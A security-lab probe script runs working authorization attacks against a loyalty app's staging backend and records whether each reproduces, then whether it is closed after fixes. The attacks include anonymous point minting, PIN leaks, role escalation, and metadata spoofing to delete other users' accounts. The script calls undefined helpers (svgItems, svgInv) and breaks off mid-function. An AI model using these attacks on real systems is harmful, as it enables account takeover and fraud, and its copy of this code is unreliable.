// S0.0A staging security lab — probe (run: scripts/s00a/run.sh probe.mjs <before|regression> <out.json>)
// Evidence integrity: tests are not adjusted to force a result; a vulnerability that
// doesn't appear is recorded as NOT REPRODUCED. No credentials are printed or stored.
import { spawnSync } from 'node:child_process';
import { writeFileSync } from 'node:fs';
import { loadEnv, client, psql, ID, PHONES, phoneEmail, phonePassword, E1_EMAIL, e1Password, isLabPhone, jwtClaims, wcSignature } from './lib.mjs';

const env = loadEnv();              // throws on any production ref
const c = client(env);
const [phase, outFile] = process.argv.slice(2);
const results = [];

const CUST = { M1: ID(101), S1: ID(121), C1: ID(111), C2: ID(112), C3: ID(113) };
const CARD = { M1: ID(201), S1: ID(221), C1: ID(211), C2: ID(212) };
const CH_X = ID(301), STAFF_S1 = ID(421), INV = [ID(501), ID(502), ID(503), ID(504)], ICR = ID(701);

function reseed() {
  const r = spawnSync('node', ['scripts/s00a/lab.mjs', 'reset'], { encoding: 'utf8', env: process.env });
  if (r.status !== 0 || !r.stdout.includes('"integrity": "OK"')) throw new Error('reseed failed');
}
const loginPhone = async (who) => c.signIn(phoneEmail(PHONES[who]), phonePassword(env, PHONES[who]));
const loginE1 = async () => c.signIn(E1_EMAIL, e1Password(env));
const svcGet = async (path) => (await c.svcRest('GET', path)).json;
const points = async (card) => (await svcGet(`loyalty_cards?id=eq.${card}&select=total_points,pairs_count,tier`))?.[0];
const n = (r) => (Array.isArray(r.json) ? r.json.length : 0);
const brief = (r) => `HTTP ${r.status}${Array.isArray(r.json) ? ` rows=${r.json.length}` : r.json && typeof r.json === 'object' ? ` ${JSON.stringify(r.json).slice(0, 160)}` : r.json !== null ? ` ${JSON.stringify(r.json)}` : ''}`;
function rec(id, actor, operation, expected, actual, verdict) { results.push({ id, actor, operation, expected, actual, verdict }); console.log(`${id} ${verdict} :: ${actual}`); }
async function spoofPhone(session, email, password, phone) {
  const u = await c.updateUserMetadata(session.token, { phone });
  if (!u.ok) throw new Error(`metadata update failed ${u.status}`);
  return c.signIn(email, password);            // fresh JWT carrying the edited user_metadata
}
async function assertStagingTarget(customerId) {  // destructive-test guard (T17 / T26)
  const row = (await svcGet(`customers?id=eq.${customerId}&select=name,phone`))?.[0];
  if (!row || !row.name?.startsWith('STAGING ') || !isLabPhone(row.phone)) throw new Error(`REFUSED: ${customerId} is not a tagged STAGING fixture`);
}

async function before() {
  // ── Group 0: catalog + read-only exposures + control + review bypass ──
  reseed();
  const fns = ['fx_add_points(uuid,integer)', 'award_birthday_points(uuid)', 'award_referral_points(uuid)', 'check_free_pair_reward(uuid,uuid)', 'run_annual_tier_review()', 'delete_expired_otps()'];
  const t2 = JSON.parse(psql(`select json_object_agg(f, json_build_object('anon', has_function_privilege('anon','public.'||f,'EXECUTE'), 'authenticated', has_function_privilege('authenticated','public.'||f,'EXECUTE'))) from unnest(array[${fns.map((f) => `'${f}'`).join(',')}]) f;`, {}, { readOnly: true }));
  const allTrue = Object.values(t2).every((v) => v.anon && v.authenticated);
  rec('T2', 'catalog', 'has_function_privilege(anon/authenticated, 6 functions, EXECUTE)', 'true for all', JSON.stringify(t2), allTrue ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t3 = psql(`select coalesce(string_agg(defaclacl::text, ' '), '') from pg_default_acl where defaclrole='postgres'::regrole and defaclnamespace='public'::regnamespace and defaclobjtype='f';`, {}, { readOnly: true });
  rec('T3', 'catalog', 'pg_default_acl (postgres, public, functions)', 'EXECUTE granted to anon/authenticated', t3, /anon=X/.test(t3) && /authenticated=X/.test(t3) ? 'PASS (reproduced)' : 'NOT REPRODUCED');

  const t4 = await c.rest('GET', 'staff?select=name,pin');
  rec('T4', 'anon', 'select name,pin from staff', 'PINs returned', `${brief(t4)} pins=${(t4.json || []).map((x) => x.pin).join(',')}`, n(t4) >= 2 && (t4.json || []).every((x) => x.pin) ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t7 = await c.rest('GET', 'offline_sales?select=code,customer_phone');
  rec('T7', 'anon', 'select code,customer_phone from offline_sales', "C1's phone visible", `${brief(t7)} phones=${[...new Set((t7.json || []).map((x) => x.customer_phone))].join(',')}`, (t7.json || []).some((x) => x.customer_phone === PHONES.C1) ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const c1 = await loginPhone('C1');
  const t14 = await c.rest('GET', 'staff?select=name,pin', { token: c1.token });
  rec('T14', 'C1 (customer)', 'select pin from staff', 'PINs returned', `${brief(t14)} pins=${(t14.json || []).map((x) => x.pin).join(',')}`, n(t14) >= 2 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const e1 = await loginE1();
  const t23 = await c.rest('GET', 'staff?select=name,pin', { token: e1.token });
  rec('T23', 'E1 (email-only)', 'select pin from staff', 'PINs returned', `${brief(t23)} pins=${(t23.json || []).map((x) => x.pin).join(',')}`, n(t23) >= 2 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  // T25 control (fresh E1, no customer row)
  const a = await c.fn('admin-points', { token: e1.token, body: { action: 'search', query: 'STAGING' } });
  const b = await c.fn('admin-broadcast-push', { token: e1.token, body: { segment: 'bronze', title: 'STAGING T25', body: 'STAGING T25' } });
  const i = await c.fn('inventory-approve', { token: e1.token, body: { action: 'reject', request_id: ICR } });
  rec('T25', 'E1 (email-only)', 'call admin-points / admin-broadcast-push / inventory-approve', '403 (control)', `admin-points ${a.status}, broadcast ${b.status}, inventory-approve ${i.status}`, [a, b, i].every((r) => r.status === 403) ? 'CONTROL PASS' : 'CONTROL FAIL');
  // T19 review bypass (fictional staging demo target only)
  const t19 = await c.fn('whatsapp-otp', { body: { action: 'verify', phone: '+525555555555', code: '555555' } });
  const demoEmail = t19.json?.session?.user?.email;
  rec('T19', 'anon', "whatsapp-otp verify +525555555555 / 555555 (code defaults; staging REVIEW_DEMO_PHONE=+15550100090)", 'session for the demo account without OTP', `HTTP ${t19.status} success=${t19.json?.success} session_user=${demoEmail}`, t19.ok && t19.json?.success && demoEmail === phoneEmail(PHONES.DEMO) ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t8r = await c.rest('GET', 'inventory_change_requests?select=id,requested_by_name');
  rec('T8a', 'anon', 'select inventory_change_requests', 'rows returned', brief(t8r), n(t8r) >= 1 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t24r = await c.rest('GET', 'inventory_change_requests?select=id', { token: e1.token });

  // ── Group 1: mutating single-actor tests ──
  reseed();
  const c1b = await loginPhone('C1'); const e1b = await loginE1(); const c3 = await loginPhone('C3');
  const p0 = await points(CARD.C1);
  const t1a = await c.rest('POST', 'rpc/fx_add_points', { body: { p_card_id: CARD.C1, p_points: 1000 } });
  const p1 = await points(CARD.C1);
  const t1b = await c.rest('POST', 'rpc/fx_add_points', { token: c1b.token, body: { p_card_id: CARD.C1, p_points: 1000 } });
  const p2 = await points(CARD.C1);
  rec('T1', 'anon; C1', 'rpc fx_add_points(C1.card, 1000) as anon, then as C1', 'both succeed; +1000 each', `anon ${brief(t1a)} ${p0.total_points}->${p1.total_points}; C1 ${brief(t1b)} ->${p2.total_points}`, t1a.ok && t1b.ok && p1.total_points === p0.total_points + 1000 && p2.total_points === p1.total_points + 1000 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t5 = await c.rest('PATCH', `channel_inventory?id=eq.${INV[0]}`, { body: { price: 1 } });
  const price = (await svcGet(`channel_inventory?id=eq.${INV[0]}&select=price`))?.[0]?.price;
  rec('T5', 'anon', 'update channel_inventory set price=1', '1 row updated', `${brief(t5)} price_now=${price}`, n(t5) === 1 && Number(price) === 1 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t6 = await c.rest('POST', 'offline_sales', { body: { code: 'STGX06', channel_id: CH_X, items: [], total: 1 } });
  rec('T6', 'anon', "insert offline_sales ('STGX06')", 'inserted', brief(t6), t6.status === 201 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const icrBody = (who) => ({ channel_id: CH_X, requested_by_staff_id: STAFF_S1, requested_by_name: `STAGING ${who}`, action: 'adjust_stock', payload: { channel_inventory_id: INV[1], target_stock: 99, current_stock: 5 } });
  const t8i = await c.rest('POST', 'inventory_change_requests', { body: icrBody('anon T8') });
  rec('T8b', 'anon', "insert inventory_change_requests with S1's staff id", 'inserted', brief(t8i), t8i.status === 201 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t24i = await c.rest('POST', 'inventory_change_requests', { token: e1b.token, body: icrBody('E1 T24') });
  rec('T24', 'E1 (email-only)', "select ICRs; insert ICR with S1's staff id", 'both allowed', `read ${brief(t24r)}; insert ${brief(t24i)}`, n(t24r) >= 1 && t24i.status === 201 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t12 = await c.rest('POST', 'loyalty_cards', { token: c3.token, body: { customer_id: CUST.C3, qr_code: 'STG-C3-T12', total_points: 100000 } });
  rec('T12', 'C3 (no card)', 'insert loyalty_cards total_points=100000', 'inserted; tier gold', `${brief(t12)}`, t12.status === 201 && t12.json?.[0]?.tier === 'gold' ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t13 = await c.rest('POST', 'loyalty_cards', { token: c1b.token, body: { customer_id: CUST.C1, qr_code: 'STG-C1-T13', total_points: 0 } });
  const cards = await svcGet(`loyalty_cards?customer_id=eq.${CUST.C1}&select=id`);
  rec('T13', 'C1', 'insert a second loyalty card', 'inserted (2 cards)', `${brief(t13)} cards_now=${cards.length}`, t13.status === 201 && cards.length === 2 ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t11 = await c.rest('PATCH', `customers?auth_user_id=eq.${c1b.uid}`, { token: c1b.token, body: { phone: '+15550100097' } });
  const ph = (await svcGet(`customers?id=eq.${CUST.C1}&select=phone`))?.[0]?.phone;
  rec('T11', 'C1', 'update own phone to an unused number', 'phone changed', `${brief(t11)} phone_now=${ph}`, n(t11) === 1 && ph === '+15550100097' ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  const t9 = await c.rest('PATCH', `customers?auth_user_id=eq.${c1b.uid}`, { token: c1b.token, body: { role: 'admin' } });
  const role = (await svcGet(`customers?id=eq.${CUST.C1}&select=role`))?.[0]?.role;
  rec('T9', 'C1', "update own role to 'admin'", 'role becomes admin', `${brief(t9)} role_now=${role}`, n(t9) === 1 && role === 'admin' ? 'PASS (reproduced)' : 'NOT REPRODUCED');

  // ── Group 2/3: E1 role escalation at insert (T10, T21) ──
  for (const id of ['T10', 'T21']) {
    reseed();
    const e = await loginE1();
    const r = await c.rest('POST', 'customers', { token: e.token, body: { auth_user_id: e.uid, phone: PHONES.E1SQUAT, name: `STAGING E1 ${id}`, country: 'MX', role: 'admin' } });
    const chain = await c.fn('admin-points', { token: e.token, body: { action: 'search', query: 'STAGING' } });
    rec(id, 'E1 (email-only)', "insert customers(role 'admin') for itself", 'inserted as admin', `${brief(r)}; then admin-points search HTTP ${chain.status} customers_returned=${chain.json?.customers?.length ?? 0}`, r.status === 201 && r.json?.[0]?.role === 'admin' ? 'PASS (reproduced)' : 'NOT REPRODUCED');
  }

  // ── Group 4: phone squatting (T22) ──
  reseed();
  { const e = await loginE1();
    const ins = await c.rest('POST', 'customers', { token: e.token, body: { auth_user_id: e.uid, phone: PHONES.U1, name: 'STAGING E1 squat', country: 'MX' } });
    const cust = ins.json?.[0]?.id;
    const card = cust ? await c.rest('POST', 'loyalty_cards', { token: e.token, body: { customer_id: cust, qr_code: 'STG-E1-T22', total_points: 0, pairs_count: 0, tier: 'bronze' } }) : null;
    const link = await c.fn('link-orders', { token: e.token });
    const orphan = (await svcGet('unmatched_orders?wc_order_id=eq.990000199&select=matched_at'))?.[0];
    const pts = card?.json?.[0]?.id ? await points(card.json[0].id) : null;
    rec('T22', 'E1 (email-only)', "insert customers with unregistered buyer U1's phone, add card, call link-orders", "row inserted; U1's orphan order credited to E1", `customer ${brief(ins)}; card ${card ? card.status : '-'}; link-orders ${brief(link)}; orphan_matched=${!!orphan?.matched_at}; e1_points=${pts?.total_points}`, ins.status === 201 && orphan?.matched_at && pts?.total_points === 100 ? 'PASS (reproduced)' : 'NOT REPRODUCED'); }

  // ── Group 5: metadata-trust RLS (T15, T16) ──
  reseed();
  { const c1c = await loginPhone('C1');
    const ctl = [await c.rest('PATCH', `staff?id=eq.${STAFF_S1}`, { token: c1c.token, body: { active: false } }),
                 await c.rest('POST', 'channels', { token: c1c.token, body: { name: 'STAGING Spoof ctl', type: 'store' } }),
                 await c.rest('DELETE', 'offline_sales?code=eq.STGA01', { token: c1c.token })];
    const sp = await spoofPhone(c1c, phoneEmail(PHONES.C1), phonePassword(env, PHONES.C1), PHONES.M1);
    const atk = [await c.rest('PATCH', `staff?id=eq.${STAFF_S1}`, { token: sp.token, body: { active: false } }),
                 await c.rest('POST', 'channels', { token: sp.token, body: { name: 'STAGING Spoof T15', type: 'store' } }),
                 await c.rest('DELETE', 'offline_sales?code=eq.STGA01', { token: sp.token })];
    const ctlBlocked = n(ctl[0]) === 0 && ctl[1].status >= 400 && n(ctl[2]) === 0;
    const atkOk = n(atk[0]) === 1 && atk[1].status === 201 && n(atk[2]) === 1;
    rec('T15', "C1 with user_metadata.phone = M1's phone", 'update staff / insert channels / delete offline_sales (control first without spoof)', 'control blocked; spoofed succeeds', `control: ${ctl.map(brief).join(' | ')} ; spoofed: ${atk.map(brief).join(' | ')}`, ctlBlocked && atkOk ? 'PASS (reproduced)' : 'NOT REPRODUCED');
    const t16r = await c.rest('GET', `push_tokens?customer_id=eq.${CUST.M1}&select=expo_token`, { token: sp.token });
    const t16i = await c.rest('POST', 'push_tokens', { token: sp.token, body: { customer_id: CUST.M1, expo_token: 'StagingFakeToken-T16', platform: 'ios' } });
    rec('T16', "C1 with user_metadata.phone = M1's phone", "read / insert M1's push tokens", 'allowed', `read ${brief(t16r)}; insert ${brief(t16i)}`, n(t16r) >= 1 && t16i.status === 201 ? 'PASS (reproduced)' : 'NOT REPRODUCED'); }

  // ── Group 6: delete-account spoof (T17, destructive, guarded) ──
  reseed();
  { await assertStagingTarget(CUST.C1);
    const c2 = await loginPhone('C2');
    const sp = await spoofPhone(c2, phoneEmail(PHONES.C2), phonePassword(env, PHONES.C2), PHONES.C1);
    const del = await c.fn('delete-account', { token: sp.token });
    const c1Left = (await svcGet(`customers?id=eq.${CUST.C1}&select=id`)).length;
    const c1Card = (await svcGet(`loyalty_cards?id=eq.${CARD.C1}&select=id`)).length;
    const c1Tx = (await svcGet('transactions?wc_order_id=eq.990000001&select=id')).length;
    rec('T17', "C2 with user_metadata.phone = C1's phone", 'call delete-account', "C1's customer/card/transactions deleted", `${brief(del)}; C1 customer_left=${c1Left} card_left=${c1Card} tx_left=${c1Tx}`, del.ok && c1Left === 0 && c1Card === 0 && c1Tx === 0 ? 'PASS (reproduced)' : 'NOT REPRODUCED'); }

  // ── Group 7: my-orders / link-orders spoof (T18) ──
  reseed();
  { const e = await loginE1();
    const sp = await spoofPhone(e, E1_EMAIL, e1Password(env), PHONES.C1);
    const link = await c.fn('link-orders', { token: sp.token });
    const orphan = (await svcGet('unmatched_orders?wc_order_id=eq.990000101&select=matched_at'))?.[0];
    const mo = await c.fn('my-orders', { token: sp.token });
    rec('T18', "E1 with user_metadata.phone = C1's phone (no customer row)", 'call link-orders, then my-orders', 'link-orders acts on C1; my-orders resolves C1 (5xx at the Woo call, not 404)', `link-orders ${brief(link)} orphan_matched=${!!orphan?.matched_at}; my-orders HTTP ${mo.status}`, link.ok && orphan?.matched_at && mo.status >= 500 ? 'PASS (reproduced)' : 'NOT REPRODUCED'); }

  // ── Group 8: E1 spoofing the admin (T26, destructive part guarded) ──
  reseed();
  { const e = await loginE1();
    const sp = await spoofPhone(e, E1_EMAIL, e1Password(env), PHONES.M1);
    const ops = [await c.rest('PATCH', `staff?id=eq.${STAFF_S1}`, { token: sp.token, body: { active: false } }),
                 await c.rest('POST', 'channels', { token: sp.token, body: { name: 'STAGING Spoof T26', type: 'store' } }),
                 await c.rest('DELETE', 'offline_sales?code=eq.STGA01', { token: sp.token }),
                 await c.rest('GET', `push_tokens?customer_id=eq.${CUST.M1}&select=expo_token`, { token: sp.token })];
    await assertStagingTarget(CUST.M1);
    const del = await c.fn('delete-account', { token: sp.token });
    const m1Left = (await svcGet(`customers?id=eq.${CUST.M1}&select=id`)).length;
    rec('T26', "E1 with user_metadata.phone = M1's (admin) phone", 'T15/T16 operations, then delete-account', 'all succeed; M1 customer deleted', `${ops.map(brief).join(' | ')} ; delete-account ${brief(del)} M1_left=${m1Left}`, n(ops[0]) === 1 && ops[1].status === 201 && n(ops[2]) === 1 && n(ops[3]) >= 1 && m1Left === 0 ? 'PASS (reproduced)' : 'NOT REPRODUCED'); }

  rec('T20', '—', 'review bypass works only when explicitly enabled', 'post-A8 test', 'flag does not exist in baseline code', 'NOT APPLICABLE BEFORE');
  rec('T27', '—', 'app_metadata.verified_phone stamped at OTP verify', 'post-A8 test', 'see R1 for the baseline observation', 'NOT APPLICABLE BEFORE');
  reseed();
}

async function regression() {
  reseed();
  // R1 new customer OTP sign-up (OTP row seeded; no SMS/WhatsApp is ever sent)
  { const otp = await c.svcRest('POST', 'otp_verifications', { body: { phone: PHONES.R1, code: '424242', expires_at: new Date(Date.now() + 600000).toISOString() } });
    const v = await c.fn('whatsapp-otp', { body: { action: 'verify', phone: PHONES.R1, code: '424242' } });
    const tok = v.json?.session?.access_token;
    let cust, card, claim = null;
    if (tok) {
      const uid = jwtClaims(tok).sub; claim = jwtClaims(tok).app_metadata?.verified_phone ?? null;
      cust = await c.rest('POST', 'customers', { token: tok, body: { phone: PHONES.R1, name: 'STAGING R1', email: null, country: 'MX', birthday: null, shoe_size: null, wc_customer_id: null, referral_code: 'STGR1', referred_by: null, auth_user_id: uid } });
      card = cust.json?.[0]?.id ? await c.rest('POST', 'loyalty_cards', { token: tok, body: { customer_id: cust.json[0].id, qr_code: 'STG-R1-00', total_points: 0, pairs_count: 0, tier: 'bronze' } }) : null;
    }
    rec('R1', 'new user (+15550100031)', 'seed OTP row → whatsapp-otp verify → insert customer → insert card', 'customer + 1 bronze card', `otp ${otp.status}; verify HTTP ${v.status} isNewUser=${v.json?.isNewUser}; customer ${cust ? brief(cust) : '-'}; card ${card ? brief(card) : '-'}; [T27 baseline] app_metadata.verified_phone=${claim}`, cust?.status === 201 && card?.status === 201 && card.json?.[0]?.tier === 'bronze' ? 'PASS' : 'FAIL'); }
  // R2 login, avatar upload, country/avatar update
  { const s = await loginPhone('C1');
    const up = await c.storageUpload(s.token, `avatars/${s.uid}/avatar.jpg`, Buffer.from([0xff, 0xd8, 0xff, 0xd9]));
    const u1 = await c.rest('PATCH', `customers?id=eq.${CUST.C1}`, { token: s.token, body: { avatar_url: 'https://staging.invalid/avatar.jpg' } });
    const u2 = await c.rest('PATCH', `customers?id=eq.${CUST.C1}`, { token: s.token, body: { country: 'CO' } });
    rec('R2', 'C1', 'login; avatar upload; update avatar_url and country', 'all succeed', `upload ${up.status}; avatar_url ${brief(u1)}; country ${brief(u2)}`, up.ok && n(u1) === 1 && n(u2) === 1 ? 'PASS (API) + MANUAL REQUIRED (app UI)' : 'FAIL'); }
  // R3 Woo webhook processing → points, refunded → reversal (synthetic signed payload)
  { const before = await points(CARD.C1);
    const order = (status) => JSON.stringify({ id: 990000002, status, total: '999.00', currency: 'MXN', billing: { email: 'c1@staging.invalid', phone: PHONES.C1, country: 'US' }, line_items: [{ id: 1, name: 'STAGING Ballerina Test', sku: 'STG-BAL-24', quantity: 1, price: 999, total: '999.00', product_id: 1 }] });
    const send = (body) => c.fn('woocommerce-webhook', { raw: true, body, headers: { 'x-wc-webhook-signature': wcSignature(env, body), 'x-wc-webhook-topic': 'order.updated' } });
    const r1 = await send(order('processing')); const mid = await points(CARD.C1);
    const r2 = await send(order('refunded')); const after = await points(CARD.C1);
    rec('R3', 'WooCommerce (synthetic signed payload)', "order 990000002 'processing' then 'refunded'", '+100 pts then reversed', `processing ${brief(r1)} pts ${before.total_points}->${mid.total_points}; refunded ${brief(r2)} ->${after.total_points}`, mid.total_points === before.total_points + 100 && after.total_points === before.total_points ? 'PASS' : 'FAIL'); }
  // R4 link-orders legitimate (idempotent)
  { const s = await loginPhone('C1'); const b = await points(CARD.C1);
    const l1 = await c.fn('link-orders', { token: s.token }); const l2 = await c.fn('link-orders', { token: s.token }); const a = await points(CARD.C1);
    rec('R4', 'C1', 'link-orders twice', 'orphan 990000101 credited once', `1st ${brief(l1)}; 2nd ${brief(l2)}; pts ${b.total_points}->${a.total_points}`, l1.json?.linked === 1 && l2.json?.linked === 0 && a.total_points === b.total_points + 100 ? 'PASS' : 'FAIL'); }
  // R5 my-orders (Woo unreachable by design)
  { const s = await loginPhone('C1'); const r = await c.fn('my-orders', { token: s.token });
    rec('R5', 'C1', 'my-orders', 'customer resolved; Woo call fails by design', `HTTP ${r.status}`, r.status !== 404 && r.status !== 401 ? 'PARTIAL' : 'FAIL'); }
  // R6 seller sale (API replay of sale.tsx: client decrement + claim-sale scan_qr)
  { const s = await loginPhone('S1'); const b = await points(CARD.C1);
    const inv = await c.rest('GET', `channel_inventory?channel_id=eq.${CH_X}&select=id,sold`, { token: s.token });
    const row = (inv.json || []).find((x) => x.id === INV[2]);
    const dec = await c.rest('PATCH', `channel_inventory?id=eq.${INV[2]}`, { token: s.token, body: { sold: (row?.sold ?? 0) + 1 } });
    const q = await c.fn('claim-sale', { body: { action: 'scan_qr', qr_code: 'STG-C1', items: [{ inventory_id: INV[2], product_name: 'STAGING Ballerina Test', size: '25', color: 'Negro', quantity: 1, unit_price: 999 }], total: 999, channel_id: CH_X, staff_id: STAFF_S1 } });
    const a = await points(CARD.C1);
    const items = await svgItems();
    rec('R6', 'S1 (seller)', 'read inventory, decrement sold, claim-sale scan_qr', 'sold +1, sale recorded, +100 pts', `inventory ${brief(inv)}; decrement ${brief(dec)}; scan_qr ${brief(q)}; pts ${b.total_points}->${a.total_points}; store purchase_items_saved=${items}`, n(dec) === 1 && q.ok && a.total_points === b.total_points + 100 ? 'PASS (API) + MANUAL REQUIRED (app UI)' : 'FAIL'); }
  // R7 ICR + approval
  { const s = await loginPhone('S1'); const m = await loginPhone('M1');
    const ins = await c.rest('POST', 'inventory_change_requests', { token: s.token, body: { channel_id: CH_X, requested_by_staff_id: STAFF_S1, requested_by_name: 'STAGING Seller S1', action: 'adjust_stock', payload: { channel_inventory_id: INV[0], target_stock: 7, current_stock: 5 } } });
    const ap = ins.json?.[0]?.id ? await c.fn('inventory-approve', { token: m.token, body: { action: 'approve', request_id: ins.json[0].id } }) : null;
    const st = (await svgInv(INV[0]))?.stock;
    rec('R7', 'S1 → M1', 'seller creates ICR; admin approves', 'approved; stock 7', `insert ${brief(ins)}; approve ${ap ? brief(ap) : '-'}; stock=${st}`, ins.status === 201 && ap?.ok && st === 7 ? 'PASS (API) + MANUAL REQUIRED (app UI)' : 'FAIL'); }
  // R8 admin operations
  { const m = await loginPhone('M1'); const b = await points(CARD.C1);
    const ch = await c.rest('POST', 'channels', { token: m.token, body: { name: 'STAGING R8 Canal', type: 'store' } });
    const sf = await c.rest('POST', 'staff', { token: m.token, body: { name: 'STAGING R8 Vendedora', pin: '3333', channel_id: CH_X } });
    const iv = await c.rest('PATCH', `channel_inventory?id=eq.${INV[1]}`, { token: m.token, body: { stock: 8 } });
    const today = await c.rest('GET', 'offline_sales?select=total,channel_id', { token: m.token });
    const custs = await c.rest('GET', 'customers?select=id', { token: m.token });
    const se = await c.fn('admin-points', { token: m.token, body: { action: 'search', query: 'STAGING' } });
    const ad = await c.fn('admin-points', { token: m.token, body: { action: 'adjust', customer_id: CUST.C1, delta: 10, reason: 'STAGING R8' } });
    const audit = (await svcGet(`transactions?loyalty_card_id=eq.${CARD.C1}&notes=like.ajuste_admin*&select=id`)).length;
    const a = await points(CARD.C1);
    const bc = await c.fn('admin-broadcast-push', { token: m.token, body: { segment: 'bronze', title: 'STAGING R8', body: 'STAGING R8' } });
    const ok = ch.status === 201 && sf.status === 201 && n(iv) === 1 && today.ok && se.ok && ad.ok && a.total_points === b.total_points + 10 && bc.ok;
    rec('R8', 'M1 (admin)', 'create channel/staff, edit stock, Today/report reads, points search/adjust, broadcast', 'all succeed', `channel ${ch.status}; staff ${sf.status}; stock ${brief(iv)}; sales ${brief(today)}; customers_visible=${n(custs)}; search ${se.status} n=${se.json?.customers?.length}; adjust ${brief(ad)} pts ${b.total_points}->${a.total_points} audit_rows=${audit}; broadcast ${brief(bc)}; import-woo UNAVAILABLE`, ok ? 'PASS (API; import-woo UNAVAILABLE) + MANUAL REQUIRED (app UI)' : 'FAIL'); }
  // R9 tracking: own unclaimed sales
  { const s = await loginPhone('C1');
    const r = await c.rest('GET', `offline_sales?select=code&customer_phone=eq.${encodeURIComponent(PHONES.C1)}&claimed_at=is.null`, { token: s.token });
    rec('R9', 'C1', 'own unclaimed sales', 'STGA01 visible', brief(r), (r.json || []).some((x) => x.code === 'STGA01') ? 'PASS (API) + MANUAL REQUIRED (app UI)' : 'FAIL'); }
  // R10 claim code
  { const b = await points(CARD.C1);
    const r = await c.fn('claim-sale', { body: { code: 'STGA01', phone: PHONES.C1 } });
    const a = await points(CARD.C1);
    rec('R10', 'C1 (app sends anon JWT)', "claim-sale code 'STGA01'", '+100 pts; sale claimed', `${brief(r)} pts ${b.total_points}->${a.total_points}; store purchase_items_saved=${await svgItems()}`, r.ok && a.total_points === b.total_points + 100 ? 'PASS' : 'FAIL'); }
  // R11 delete own account (no spoof)
  { const s = await loginPhone('C2'); const r = await c.fn('delete-account', { token: s.token });
    const c2 = (await svcGet(`customers?id=eq.${CUST.C2}&select=id`)).length; const c1 = (await svcGet(`customers?id=eq.${CUST.C1}&select=id`)).length;
    rec('R11', 'C2', 'delete-account (own)', 'C2 deleted; C1 intact', `${brief(r)} c2_left=${c2} c1_left=${c1}`, r.ok && c2 === 0 && c1 === 1 ? 'PASS' : 'FAIL'); }
  // R12 service-role callers
  { const a = await c.svcRest('POST', 'rpc/fx_add_points', { body: { p_card_id: CARD.C1, p_points: 1 } });
    const b = await c.svcRest('POST', 'rpc/award_birthday_points', { body: { p_customer_id: CUST.C1 } });
    rec('R12', 'service_role', 'rpc fx_add_points; rpc award_birthday_points', 'both callable', `fx_add_points ${brief(a)}; award_birthday_points ${brief(b)}`, a.ok && b.ok ? 'PASS' : 'FAIL'); }
  // R13 wishlist + push token (self)
  { const s = await loginPhone('C1');
    const w1 = await c.rest('POST', 'wishlists', { token: s.token, body: { customer_id: CUST.C1, wc_product_id: 1 } });
    const w2 = await c.rest('DELETE', `wishlists?customer_id=eq.${CUST.C1}&wc_product_id=eq.1`, { token: s.token });
    const pt = await c.rest('POST', 'push_tokens', { token: s.token, body: { customer_id: CUST.C1, expo_token: 'StagingFakeToken-C1', platform: 'ios' } });
    rec('R13', 'C1', 'wishlist add/remove; register push token', 'all succeed', `wish+ ${brief(w1)}; wish- ${brief(w2)}; token ${brief(pt)}`, w1.status === 201 && n(w2) === 1 && pt.status === 201 ? 'PASS (API) + MANUAL REQUIRED (app UI)' : 'FAIL'); }
  reseed();
}
// ── A1 AFTER: T1–T3 plus read-only catalog verification ──
const A1_FNS = ['fx_add_points(uuid,integer)', 'award_birthday_points(uuid)', 'award_referral_points(uuid)', 'check_free_pair_reward(uuid,uuid)', 'run_annual_tier_review()', 'delete_expired_otps()'];
const HELPERS = ['my_customer_id()', 'my_phone()', 'my_role()'];
async function afterA1() {
  reseed();
  const c1 = await loginPhone('C1');
  const p0 = await points(CARD.C1);
  const a = await c.rest('POST', 'rpc/fx_add_points', { body: { p_card_id: CARD.C1, p_points: 1000 } });
  const b = await c.rest('POST', 'rpc/fx_add_points', { token: c1.token, body: { p_card_id: CARD.C1, p_points: 1000 } });
  const p1 = await points(CARD.C1);
  rec('T1', 'anon; C1', 'rpc fx_add_points(C1.card, 1000) as anon, then as C1', 'both denied; balance unchanged', `anon ${brief(a)}; C1 ${brief(b)}; balance ${p0.total_points}->${p1.total_points}`, !a.ok && !b.ok && p1.total_points === p0.total_points ? 'CLOSED' : 'STILL OPEN');
  const priv = JSON.parse(psql(`select json_object_agg(f, json_build_object('public', has_function_privilege('public','public.'||f,'EXECUTE'), 'anon', has_function_privilege('anon','public.'||f,'EXECUTE'), 'authenticated', has_function_privilege('authenticated','public.'||f,'EXECUTE'), 'service_role', has_function_privilege('service_role','public.'||f,'EXECUTE'))) from unnest(array[${[...A1_FNS, ...HELPERS].map((f) => `'${f}'`).join(',')}]) f;`, {}, { readOnly: true }));
  const internalClosed = A1_FNS.every((f) => !priv[f].public && !priv[f].anon && !priv[f].authenticated && priv[f].service_role);
  rec('T2', 'catalog', 'EXECUTE on the 6 internal functions', 'PUBLIC/anon/authenticated false; service_role true', JSON.stringify(Object.fromEntries(A1_FNS.map((f) => [f, priv[f]]))), internalClosed ? 'CLOSED' : 'STILL OPEN');
  const helpersOk = HELPERS.every((f) => priv[f].anon && priv[f].authenticated);
  rec('CAT-helpers', 'catalog', 'RLS helper EXECUTE preserved', 'anon/authenticated true', JSON.stringify(Object.fromEntries(HELPERS.map((f) => [f, priv[f]]))), helpersOk ? 'PRESERVED' : 'BROKEN');
  const acl = psql(`select coalesce(string_agg(coalesce(nullif(defaclnamespace::regnamespace::text,'-'),'(global)') || ':' || defaclacl::text, ' '), '') from pg_default_acl where defaclrole='postgres'::regrole and defaclobjtype='f';`, {}, { readOnly: true });
  const publicSchemaAcl = (acl.match(/public:\{[^}]*\}/) || [''])[0];
